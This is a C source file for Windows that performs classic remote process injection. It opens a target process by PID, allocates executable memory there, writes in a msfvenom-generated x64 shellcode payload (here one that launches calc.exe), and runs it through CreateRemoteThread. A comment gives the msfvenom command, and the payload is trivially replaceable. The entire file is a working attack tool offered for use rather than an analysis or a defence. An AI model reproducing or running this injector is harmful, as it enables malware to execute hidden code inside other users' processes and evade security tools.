#include <windows.h>
#include <sys/types.h>
#include <unistd.h>


int main(int argc, char **argv){
  // make sure that you will inject a process working under the same architecture
  // if you want to run the executable under x64 make sure to compile it with 64bit compiler


  // the process id you want to inject the shellcode into
	int process_id = atoi(argv[1]);

	// msfvenom -p windows/x64/exec cmd=calc.exe EXITFUNC=thread -f c -v shellcode
	char shellcode[] = \
  "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
  "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
  "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
  "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
  "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
  "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
  "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
  "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
  "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
  "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
  "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
  "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
  "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
  "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
  "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
  "\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
  "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
  "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
  "\x63\x2e\x65\x78\x65\x00";


	HANDLE process_handle;
	DWORD pointer_after_allocated;
  
  // open the process and save the handle
	process_handle =  OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
	if (process_handle==NULL)
{
	  puts("[-]Error while open the process\n");

}else{
	puts("[+] Process Opened sucessfully\n");
}
  // Allocate the required memory
	pointer_after_allocated = VirtualAllocEx(process_handle, NULL , sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if(pointer_after_allocated==NULL){
		puts("[-]Error while get the base address to write\n");
	}else{
		printf("[+]Got the address to write 0x%x\n", pointer_after_allocated);
	}
  // check if the shellcode has been written
	if(WriteProcessMemory(process_handle, (LPVOID)pointer_after_allocated, (LPCVOID)shellcode, sizeof(shellcode), 0)){
		puts("[+]Injected\n");
		puts("[+]Running the shellcode as new thread !\n");

    // create thread and execute the shellcode
		CreateRemoteThread(process_handle, NULL, 100,(LPTHREAD_START_ROUTINE)pointer_after_allocated, NULL, NULL, 0x50002);

	}else{
	puts("Not Injected\n");
	}



}